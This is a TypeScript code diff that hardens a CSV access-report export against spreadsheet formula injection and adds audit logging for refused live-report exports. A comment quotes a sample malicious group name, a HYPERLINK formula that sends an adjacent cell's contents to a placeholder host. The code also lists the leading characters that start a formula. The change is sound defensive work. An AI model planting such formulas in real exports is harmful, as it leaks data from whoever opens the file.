@@ -20,6 +20,48 @@ import {
  * ugly and it is the only version that stays true after somebody sorts by
  * column D.
  */
+/**
+ * The characters a spreadsheet treats as the start of a formula.
+ *
+ * `\t` and `\r` are on the list because Excel and LibreOffice both skip leading
+ * whitespace before looking at the first meaningful character, so a cell that
+ * begins with a tab and then `=` is a formula.
+ */
+const FORMULA_INTRODUCERS = ['=', '+', '-', '@', '\t', '\r'];
+
+/**
+ * One CSV cell, escaped so it cannot execute and cannot break the record.
+ *
+ * EVERY VALUE IN THIS EXPORT ORIGINATES IN DIRECTORY OR TARGET DATA, and that
+ * is what makes the formula case a real attack rather than a lint rule: the
+ * person who names an Active Directory group is a TARGET administrator, not a
+ * Syntra one, and inventorying systems Syntra does not control is this module's
+ * entire job. A group named `=HYPERLINK("http://x/?"&A2,"click")` executes the
+ * moment an auditor opens the export, and the cell beside it is somebody's
+ * access.
+ *
+ * QUOTING IS NOT THE DEFENCE. A spreadsheet strips the quotes before deciding
+ * whether the value is a formula, so the previous form -- quote on `"`, `\n`
+ * and `,` -- would not have neutralised one even if it had matched. The value
+ * has to stop being a formula, which means a leading apostrophe: the
+ * convention every spreadsheet reads as "this is text", and which is stripped
+ * on display.
+ *
+ * `\r` is in the quoting test now as well. It was not, so a lone carriage
+ * return ended the record and every field after it landed under the wrong
+ * header -- silently, in a document whose whole purpose is that somebody can
+ * read it a year later.
+ *
+ * An ordinary value is returned untouched. Quoting or prefixing every cell
+ * would make the common case unreadable to defend against the rare one, and an
+ * export nobody can read is an export nobody checks.
+ */
+export function csvCell(value: string): string {
+  const dangerous = FORMULA_INTRODUCERS.includes(value.slice(0, 1));
+  const body = dangerous ? `'${value}` : value;
+  return /["\n\r,]/.test(body) || dangerous ? `"${body.replace(/"/g, '""')}"` : body;
+}
+
 export function toCsv(header: ReportHeader, rows: readonly Record<string, string>[]): string {
   const headerColumns: Record<string, string> = {
     snapshot_id: header.snapshotId,
@@ -36,7 +78,8 @@ export function toCsv(header: ReportHeader, rows: readonly Record<string, string
   };
 
   const columns = [...Object.keys(headerColumns), ...Object.keys(rows[0] ?? { note: '' })];
-  const escape = (value: string) => (/["\n,]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value);
+  // ONE name for the escape, so the two rendering paths cannot diverge.
+  const escape = csvCell;
 
   const lines = [columns.join(',')];
   for (const row of rows) {
@@ -58,6 +101,33 @@ export async function exportReportCsv(
 ): Promise<string> {
   const header = headerOf(e);
   if (header.live) {
+    // AUDITED BEFORE IT THROWS. §10: "the audit log should be able to answer
+    // who took a copy of it" -- and a refusal is part of that answer. The
+    // successful path was audited and this one was not, so repeated refused
+    // attempts left no trace, which is exactly what an attempt to walk out with
+    // everybody's access looks like when it does not work the first time.
+    //
+    // Its OWN transaction, committed before the throw, for the reason the
+    // decision path learned the hard way: `withTenant` is
+    // `prisma.$transaction(fn)`, so a throw inside the transaction that wrote
+    // the row takes the row with it and the trail records nothing.
+    await withTenant(tenantId, (tx) =>
+      recordEvent(tx, {
+        actorUserId,
+        action: 'govern.report.export',
+        targetType: 'AccessSnapshot',
+        targetId: null,
+        outcome: 'failure',
+        sourceIp: null,
+        payload: {
+          format: 'csv',
+          scope,
+          reason: 'live_report',
+          statement:
+            'a live report has no as-of time, and evidence with no as-of time is not evidence',
+        },
+      }),
+    );
     throw new Error(
       'a live report cannot be exported as evidence: it has no as-of time, and evidence with no as-of time is not evidence',
     );
